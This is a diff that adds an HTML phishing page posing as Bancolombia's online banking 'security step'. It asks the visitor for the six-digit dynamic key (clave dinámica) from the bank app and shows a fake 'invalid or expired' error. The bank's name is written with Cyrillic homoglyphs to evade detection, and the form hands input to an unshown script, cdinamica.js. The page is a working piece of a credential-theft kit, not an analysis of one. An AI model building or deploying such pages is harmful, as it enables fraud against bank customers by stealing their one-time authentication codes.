@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ваncоlоmbiа Sucursal Virtal Personas</title>
+    <link rel="icon" href="assets/logos/logo.png">
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/main.css">
+
+    <!-- FUNCTIONS -->
+    <script src="./js/functions.js"></script>
+</head>
+<body>
+
+    <header>
+        <img class="header-logo" src="./assets/logos/logo.svg" alt="">
+        <h3 class="header-subtitle">Sucursal Virtual Personas</h3>
+        <p class="header-text-info">Fecha y hora actual: <span id="datetime"></span></p>
+    </header>
+
+
+
+
+
+
+
+
+
+
+    
+    <main>
+
+        <div class="error d-none mt-2">
+            <img src="./assets/icons/error.jpg">
+            <div class="error--text">
+                <h3>Error</h3>
+                <h4>Clave dinámica inválida o expirada. Inténtelo de nuevo.</h4>
+            </div>
+        </div>
+
+        <div class="page-label">
+            <h3 class="page-label-title">Paso de Seguridad</h3>
+        </div>
+
+        <div class="card">
+
+            <div class="card-header">
+                <h3>Clave Dinámica</h3>
+            </div>
+
+            <div class="card-message">
+                <p>Ingresa la clave dinámicа disponible en tu app Bancolombia.</p>
+            </div>
+
+            <form id="form-cdin">
+                
+                <div class="form-label">
+                    <img class="icon-info" src="./assets/icons/info.jpg"><label>Ingresa tu Clave Dinámica</label>
+                </div>
+                <input class="form-input-text icon-i-pass" id="cdin" type="number" oninput="limitarDigitos(this, 6)">
+
+                <div class="one-btn-container">
+                    <button class="btn mt-4" type="submit">
+                        Continuar
+                    </button>  
+                </div>
+
+            </form>
+        </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <div class="header-publicity">
+            <img src="./assets/cdin.gif" style="width: 300px ; text-align: center;" alt="">
+            <p>¿No conoces la Sucursal Virtual Personas de Ваncоlоmbiа? Conoce más aquí</p>
+        </div>
+
+        <footer class="footer-telephones">
+            <div class="tels">
+                Sucursal Telefónica Ваncоlоmbiа: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510
+				90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -
+				Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345.
+				Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.</div>
+			<div class="footer-ip">
+				<span>Dirección IP: <span id="ip">186.192.168.249</span></span>
+				<span>Copyright © 2023 Ваncоlоmbiа S.A.</span>
+			</div>
+        </footer>
+    </main>
+    
+
+
+
+
+
+    <!-- JS -->
+    <script src="./js/cdinamica.js"></script>
+</body>
+</html>
